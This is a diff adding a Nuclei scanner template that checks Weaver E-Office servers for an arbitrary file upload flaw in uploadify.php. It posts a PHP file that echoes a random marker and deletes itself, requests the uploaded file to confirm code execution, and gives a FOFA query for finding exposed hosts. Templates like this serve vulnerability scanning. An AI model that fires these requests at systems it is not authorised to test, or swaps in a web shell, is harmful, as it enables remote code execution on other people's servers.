@@ -1,0 +1,50 @@
+id: weaver-uploadify-file-upload
+
+info:
+  name: OA E-Office Uploadify - Arbitrary File Upload
+  author: SleepingBag945
+  severity: critical
+  reference:
+    - https://github.com/w-digital-scanner/w9scan/blob/master/plugins/weaver_oa/2158.py
+  metadata:
+    verified: true
+    max-request: 3
+    fofa-query: app="泛微-EOffice"
+  tags: weaver,e-office,oa,instrusive,rce,intrusive
+variables:
+  filename: "{{to_lower(rand_base(5))}}"
+  string: "{{randstr}}"
+
+http:
+  - raw:
+      - |
+        GET /general/weibo/javascript/uploadify/uploadify.php HTTP/1.1
+        Host: {{Hostname}}
+      - |
+        POST /general/weibo/javascript/uploadify/uploadify.php HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/71.0.3578.98 Safari/537.36
+        Accept: */*
+        Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryjetvpuye
+        Accept-Encoding: gzip
+
+        ------WebKitFormBoundaryjetvpuye
+        Content-Disposition: form-data; name="Filedata"; filename="{{filename}}.php"
+        Content-Type: application/octet-stream
+
+        <?php echo "{{randstr}}";unlink(__FILE__);?>
+        ------WebKitFormBoundaryjetvpuye--
+      - |
+        GET /attachment/personal/_temp.php HTTP/1.1
+        Host: {{Hostname}}
+
+    matchers-condition: and
+    matchers:
+      - type: dsl
+        dsl:
+          - "status_code_1 == 200"
+          - "contains(body_2, 'imageSrc') && contains(body_2, 'height')"
+          - "status_code_3 == 200 && contains(body_3,'{{randstr}}')"
+        condition: and
+
+# digest: 4b0a00483046022100b298fa832bba4f3d420afb6361e5afcf538de17d17d2b874c95bc538d1e03f160221008d6dbc99549673bf05b473bac66f580189e8ca60d111deb6d98ab03d9349a99b:922c64590222798bb761d5b6d8e72950
